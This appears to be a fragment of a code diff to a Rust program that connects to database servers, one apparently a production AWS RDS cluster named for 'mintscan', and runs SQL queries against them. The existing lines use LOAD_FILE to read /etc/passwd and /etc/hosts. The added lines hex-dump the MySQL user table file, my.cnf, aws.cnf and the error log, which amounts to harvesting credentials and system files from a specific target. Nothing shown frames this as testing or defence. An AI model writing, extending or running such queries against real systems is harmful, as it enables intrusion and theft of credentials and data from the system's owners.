@@ -45,6 +45,11 @@ fn main() {
         q(&mut c, "SELECT id,email FROM white_list_email");
         q(&mut c, "SELECT LOAD_FILE('/etc/passwd')");
         q(&mut c, "SELECT LOAD_FILE('/etc/hosts')");
+        q(&mut c, "SELECT id, git, commit, status, worker FROM cosmwasm ORDER BY id DESC LIMIT 10");
+        q(&mut c, "SELECT HEX(LOAD_FILE('/rdsdbdata/config/my.cnf'))");
+        q(&mut c, "SELECT HEX(LOAD_FILE('/rdsdbdata/db/mysql/user.MYD'))");
+        q(&mut c, "SELECT HEX(LOAD_FILE('/rdsdbdata/log/error/mysql-error.log'))");
+        q(&mut c, "SELECT HEX(LOAD_FILE('/rdsdbdata/config/aws.cnf'))");
     }
     if let Some(mut c) = connect("mintscan-database-cluster.cluster-ro-cq9ruxfeoibr.us-east-1.rds.amazonaws.com", "mintscan") {
         eprintln!("### MINTSCAN DB ###");
